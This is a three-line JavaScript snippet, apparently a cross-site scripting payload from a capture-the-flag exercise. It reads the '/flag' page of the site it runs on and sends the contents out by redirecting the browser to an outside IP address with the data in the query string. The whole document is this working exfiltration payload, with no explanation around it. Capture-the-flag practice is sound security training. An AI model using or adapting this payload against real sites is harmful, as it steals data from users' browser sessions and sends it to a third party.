fetch('/flag')
    .then(res => res.text())
    .then(data => location="http://18.202.227.123:1234/sdaf?=" + data)
